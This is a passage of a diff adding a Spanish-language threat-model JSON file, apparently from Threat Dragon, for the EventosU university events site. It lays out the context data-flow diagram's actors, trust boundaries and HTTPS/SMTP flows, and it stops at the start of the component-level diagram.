@@ -1,0 +1,4042 @@
+{
+  "version": "2.6.2",
+  "summary": {
+    "title": "EventosU",
+    "owner": "[Nombre completo del integrante 1] y [Nombre completo del integrante 2]",
+    "description": "Modelo de amenazas del sitio web EventosU en fase de diseño: publicación de eventos universitarios, inscripción, pago con pasarela externa, envío de entrada QR por correo, validación en puerta y exportación de inscritos.",
+    "id": 0
+  },
+  "detail": {
+    "contributors": [
+      {
+        "name": "[Nombre completo del integrante 1] ([Carné integrante 1])"
+      },
+      {
+        "name": "[Nombre completo del integrante 2] ([Carné integrante 2])"
+      }
+    ],
+    "diagrams": [
+      {
+        "id": 0,
+        "title": "DFD nivel 0 - Contexto",
+        "diagramType": "STRIDE",
+        "placeholder": "New STRIDE diagram description",
+        "thumbnail": "./public/content/images/thumbnail.stride.jpg",
+        "version": "2.6.2",
+        "description": "EventosU como un solo proceso con sus actores externos y proveedores.",
+        "cells": [
+          {
+            "position": {
+              "x": 20,
+              "y": 20
+            },
+            "size": {
+              "width": 300,
+              "height": 800
+            },
+            "attrs": {
+              "label": {
+                "text": "Internet: usuarios (no confiable)"
+              }
+            },
+            "visible": true,
+            "shape": "trust-boundary-box",
+            "id": "5d419a7f-fd58-5e5c-8baa-cc2a4aa1f93b",
+            "zIndex": -1,
+            "data": {
+              "type": "tm.BoundaryBox",
+              "name": "Internet: usuarios (no confiable)",
+              "description": "",
+              "isTrustBoundary": true,
+              "hasOpenThreats": false
+            }
+          },
+          {
+            "position": {
+              "x": 520,
+              "y": 250
+            },
+            "size": {
+              "width": 320,
+              "height": 320
+            },
+            "attrs": {
+              "label": {
+                "text": "Nube EventosU"
+              }
+            },
+            "visible": true,
+            "shape": "trust-boundary-box",
+            "id": "0551077a-e759-5674-8ea8-38e319923e24",
+            "zIndex": -1,
+            "data": {
+              "type": "tm.BoundaryBox",
+              "name": "Nube EventosU",
+              "description": "",
+              "isTrustBoundary": true,
+              "hasOpenThreats": false
+            }
+          },
+          {
+            "position": {
+              "x": 1040,
+              "y": 120
+            },
+            "size": {
+              "width": 300,
+              "height": 600
+            },
+            "attrs": {
+              "label": {
+                "text": "Proveedores externos"
+              }
+            },
+            "visible": true,
+            "shape": "trust-boundary-box",
+            "id": "3ed3d3f7-d70b-5cdd-9565-86a25e0aa156",
+            "zIndex": -1,
+            "data": {
+              "type": "tm.BoundaryBox",
+              "name": "Proveedores externos",
+              "description": "",
+              "isTrustBoundary": true,
+              "hasOpenThreats": false
+            }
+          },
+          {
+            "position": {
+              "x": 95,
+              "y": 70
+            },
+            "size": {
+              "width": 150,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Visitante"
+              },
+              "body": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "actor",
+            "zIndex": 1,
+            "id": "f97e7d26-6cd5-5d3b-bd99-efa7c0d28d87",
+            "data": {
+              "name": "Visitante",
+              "description": "Consulta el catálogo público sin iniciar sesión.",
+              "type": "tm.Actor",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "providesAuthentication": false
+            }
+          },
+          {
+            "position": {
+              "x": 95,
+              "y": 220
+            },
+            "size": {
+              "width": 150,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Estudiante o público"
+              },
+              "body": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "actor",
+            "zIndex": 1,
+            "id": "d3782010-6ffb-5f64-a98e-0448fc3c147e",
+            "data": {
+              "name": "Estudiante o público",
+              "description": "Se registra, se inscribe, paga y descarga su entrada QR.",
+              "type": "tm.Actor",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "providesAuthentication": false
+            }
+          },
+          {
+            "position": {
+              "x": 95,
+              "y": 370
+            },
+            "size": {
+              "width": 150,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Organizador"
+              },
+              "body": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "actor",
+            "zIndex": 1,
+            "id": "68dbce1c-a4d7-566b-8063-fb1ef8e3b823",
+            "data": {
+              "name": "Organizador",
+              "description": "Crea eventos, sube afiches y exporta la lista de inscritos.",
+              "type": "tm.Actor",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "providesAuthentication": false
+            }
+          },
+          {
+            "position": {
+              "x": 95,
+              "y": 520
+            },
+            "size": {
+              "width": 150,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Administrador"
+              },
+              "body": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "actor",
+            "zIndex": 1,
+            "id": "1d045ec7-6e21-52dd-b2e8-e078a32dbeca",
+            "data": {
+              "name": "Administrador",
+              "description": "Gestiona usuarios, roles y reportes.",
+              "type": "tm.Actor",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "providesAuthentication": false
+            }
+          },
+          {
+            "position": {
+              "x": 95,
+              "y": 690
+            },
+            "size": {
+              "width": 150,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Personal de Puerta"
+              },
+              "body": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "actor",
+            "zIndex": 1,
+            "id": "9e30fbd2-2620-5f87-a617-b3d572aa1187",
+            "data": {
+              "name": "Personal de Puerta",
+              "description": "Valida entradas con la app móvil.",
+              "type": "tm.Actor",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "providesAuthentication": false
+            }
+          },
+          {
+            "position": {
+              "x": 600,
+              "y": 330
+            },
+            "size": {
+              "width": 160,
+              "height": 160
+            },
+            "attrs": {
+              "text": {
+                "text": "EventosU"
+              },
+              "body": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "process",
+            "zIndex": 1,
+            "id": "23a90ea9-fe78-58e3-b6b1-8a407ef40d97",
+            "data": {
+              "name": "EventosU",
+              "description": "Sistema completo: sitio web, panel /admin, API, base de datos, almacenamiento y app de puerta.",
+              "type": "tm.Process",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "handlesCardPayment": false,
+              "handlesGoodsOrServices": false,
+              "isWebApplication": false,
+              "privilegeLevel": ""
+            }
+          },
+          {
+            "position": {
+              "x": 1115,
+              "y": 170
+            },
+            "size": {
+              "width": 150,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Microsoft Entra ID"
+              },
+              "body": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "actor",
+            "zIndex": 1,
+            "id": "7556cc92-948a-5d1c-a01a-0d8de9c7c7bd",
+            "data": {
+              "name": "Microsoft Entra ID",
+              "description": "Proveedor de identidad institucional (OAuth 2.0 / OIDC).",
+              "type": "tm.Actor",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "providesAuthentication": false
+            }
+          },
+          {
+            "position": {
+              "x": 1115,
+              "y": 385
+            },
+            "size": {
+              "width": 150,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Pasarela de pagos"
+              },
+              "body": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "actor",
+            "zIndex": 1,
+            "id": "612a3bfb-efb7-5042-a134-0c827c54ef5f",
+            "data": {
+              "name": "Pasarela de pagos",
+              "description": "Proveedor externo de cobro con tarjeta.",
+              "type": "tm.Actor",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "providesAuthentication": false
+            }
+          },
+          {
+            "position": {
+              "x": 1115,
+              "y": 600
+            },
+            "size": {
+              "width": 150,
+              "height": 70
+            },
+            "attrs": {
+              "text": {
+                "text": "Servicio de correo"
+              },
+              "body": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "actor",
+            "zIndex": 1,
+            "id": "f69f29eb-ca2e-5025-8586-b6a08a1fa7a5",
+            "data": {
+              "name": "Servicio de correo",
+              "description": "Proveedor externo de envío de correo.",
+              "type": "tm.Actor",
+              "isTrustBoundary": false,
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "threats": [],
+              "hasOpenThreats": false,
+              "providesAuthentication": false
+            }
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": "block"
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Catálogo de eventos\n(HTTPS, JSON)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Catálogo de eventos\n(HTTPS, JSON)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": true,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "e49277fa-0fba-5ab5-b627-446a613ff051",
+            "source": {
+              "cell": "f97e7d26-6cd5-5d3b-bd99-efa7c0d28d87"
+            },
+            "target": {
+              "cell": "23a90ea9-fe78-58e3-b6b1-8a407ef40d97"
+            },
+            "vertices": [
+              {
+                "x": 450,
+                "y": 150
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Registro, login e inscripción\n(HTTPS, JSON)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Registro, login e inscripción\n(HTTPS, JSON)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "df7a5a09-1515-5238-a745-fd55bb2ebf0c",
+            "source": {
+              "cell": "d3782010-6ffb-5f64-a98e-0448fc3c147e"
+            },
+            "target": {
+              "cell": "23a90ea9-fe78-58e3-b6b1-8a407ef40d97"
+            },
+            "vertices": [
+              {
+                "x": 450,
+                "y": 300
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Estado de inscripción y QR\n(HTTPS, JSON)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Estado de inscripción y QR\n(HTTPS, JSON)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "05f76652-8e1e-50db-8723-fcdbf864e4ca",
+            "source": {
+              "cell": "23a90ea9-fe78-58e3-b6b1-8a407ef40d97"
+            },
+            "target": {
+              "cell": "d3782010-6ffb-5f64-a98e-0448fc3c147e"
+            },
+            "vertices": [
+              {
+                "x": 430,
+                "y": 250
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": "block"
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Eventos, afiches y CSV de inscritos\n(HTTPS, multipart/CSV)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Eventos, afiches y CSV de inscritos\n(HTTPS, multipart/CSV)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": true,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "574b3e93-df8c-524a-b700-ed8b9865c040",
+            "source": {
+              "cell": "68dbce1c-a4d7-566b-8063-fb1ef8e3b823"
+            },
+            "target": {
+              "cell": "23a90ea9-fe78-58e3-b6b1-8a407ef40d97"
+            },
+            "vertices": [
+              {
+                "x": 430,
+                "y": 410
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": "block"
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Usuarios, roles y reportes\n(HTTPS, JSON)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Usuarios, roles y reportes\n(HTTPS, JSON)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": true,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "4184f69e-1f24-547f-93ce-ca5efa57e156",
+            "source": {
+              "cell": "1d045ec7-6e21-52dd-b2e8-e078a32dbeca"
+            },
+            "target": {
+              "cell": "23a90ea9-fe78-58e3-b6b1-8a407ef40d97"
+            },
+            "vertices": [
+              {
+                "x": 440,
+                "y": 540
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": "block"
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Validación de QR\n(HTTPS, JSON)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Validación de QR\n(HTTPS, JSON)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": true,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "32ffb56f-6a93-536f-aede-f8a965939cea",
+            "source": {
+              "cell": "9e30fbd2-2620-5f87-a617-b3d572aa1187"
+            },
+            "target": {
+              "cell": "23a90ea9-fe78-58e3-b6b1-8a407ef40d97"
+            },
+            "vertices": [
+              {
+                "x": 460,
+                "y": 680
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": "block"
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Login institucional\n(HTTPS, OAuth 2.0 / OIDC)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Login institucional\n(HTTPS, OAuth 2.0 / OIDC)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": true,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "ae7e4a06-c54e-5734-861f-b7456c89c60c",
+            "source": {
+              "cell": "23a90ea9-fe78-58e3-b6b1-8a407ef40d97"
+            },
+            "target": {
+              "cell": "7556cc92-948a-5d1c-a01a-0d8de9c7c7bd"
+            },
+            "vertices": [
+              {
+                "x": 930,
+                "y": 210
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Orden de pago\n(HTTPS, JSON)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Orden de pago\n(HTTPS, JSON)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "68db6ae2-95d0-5112-8d7d-b7cbe3b8007f",
+            "source": {
+              "cell": "23a90ea9-fe78-58e3-b6b1-8a407ef40d97"
+            },
+            "target": {
+              "cell": "612a3bfb-efb7-5042-a134-0c827c54ef5f"
+            },
+            "vertices": [
+              {
+                "x": 940,
+                "y": 380
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Webhook de pago\n(HTTPS, JSON)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Webhook de pago\n(HTTPS, JSON)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "5d3d801d-34b1-578a-9e66-f247f8adb43c",
+            "source": {
+              "cell": "612a3bfb-efb7-5042-a134-0c827c54ef5f"
+            },
+            "target": {
+              "cell": "23a90ea9-fe78-58e3-b6b1-8a407ef40d97"
+            },
+            "vertices": [
+              {
+                "x": 940,
+                "y": 470
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Envío de QR y restablecimiento\n(HTTPS, API REST)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Envío de QR y restablecimiento\n(HTTPS, API REST)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "65daa865-dff8-5077-bda5-3f4c77c8775f",
+            "source": {
+              "cell": "23a90ea9-fe78-58e3-b6b1-8a407ef40d97"
+            },
+            "target": {
+              "cell": "f69f29eb-ca2e-5025-8586-b6a08a1fa7a5"
+            },
+            "vertices": [
+              {
+                "x": 930,
+                "y": 600
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Correo con QR o enlace\n(SMTP con TLS)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Correo con QR o enlace\n(SMTP con TLS)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "SMTP/TLS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "4af9f100-43ba-52e3-87c0-8a61d08d7b3c",
+            "source": {
+              "cell": "f69f29eb-ca2e-5025-8586-b6a08a1fa7a5"
+            },
+            "target": {
+              "cell": "d3782010-6ffb-5f64-a98e-0448fc3c147e"
+            },
+            "vertices": [
+              {
+                "x": 1190,
+                "y": 790
+              },
+              {
+                "x": 700,
+                "y": 860
+              },
+              {
+                "x": 50,
+                "y": 800
+              },
+              {
+                "x": 50,
+                "y": 300
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Pago con tarjeta\n(HTTPS, página del proveedor)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Pago con tarjeta\n(HTTPS, página del proveedor)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "89aa83bc-22f5-5c74-b6a7-124f876d685a",
+            "source": {
+              "cell": "d3782010-6ffb-5f64-a98e-0448fc3c147e"
+            },
+            "target": {
+              "cell": "612a3bfb-efb7-5042-a134-0c827c54ef5f"
+            },
+            "vertices": [
+              {
+                "x": 420,
+                "y": 90
+              },
+              {
+                "x": 950,
+                "y": 90
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "id": 1,
+        "title": "DFD nivel 1 - Componentes",
+        "diagramType": "STRIDE",
+        "placeholder": "New STRIDE diagram description",
+        "thumbnail": "./public/content/images/thumbnail.stride.jpg",
+        "version": "2.6.2",
+        "description": "Componentes de EventosU, flujos con dato y protocolo, y límites de confianza. Las amenazas STRIDE están asociadas a cada elemento o flujo.",
+        "cells": [
+          {
+            "position": {
+              "x": 300,
+              "y": 20
+            },
+            "size": {
+              "width": 1420,
+              "height": 170
+            },
+            "attrs": {
+              "label": {
+                "text": "LC3 Proveedores externos"
+              }
+            },
+            "visible": true,
